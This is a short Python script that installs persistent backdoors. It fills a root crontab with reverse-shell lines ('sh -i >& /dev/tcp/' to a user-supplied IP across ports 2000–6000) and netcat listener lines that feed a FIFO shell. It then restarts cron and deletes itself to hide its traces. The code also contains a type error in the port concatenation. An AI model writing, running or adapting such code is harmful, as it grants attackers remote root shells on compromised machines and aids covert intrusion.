import subprocess

f = open('tempfile', 'w')

subprocess.run(['rm /tmp/f;mkfifo /tmp/f'], shell = True)
ip = input('ip? ')
for i in range(2000,6000):
    if (i%2):
        #tail -f /d/pc2dev | netcat <IP> <Port> | tr '\r' '\n' > /d/dev2pc
        f.write('* * * * * root sh -i >& /dev/tcp/'+ip+'/'+i+' 0>&1\n')
    else:
        f.write('* * * * * tail -f /tmp/f | nc -lnvp '+str(i)+' | tr "\r" "\n" > /tmp/f \n')
f.close()

subprocess.run(['crontab tempfile'], shell = True)
subprocess.run(['rm tempfile'], shell = True)
subprocess.run(['sudo systemctl restart cron.service'], shell = True)
subprocess.run(['rm cron.py'], shell = True)
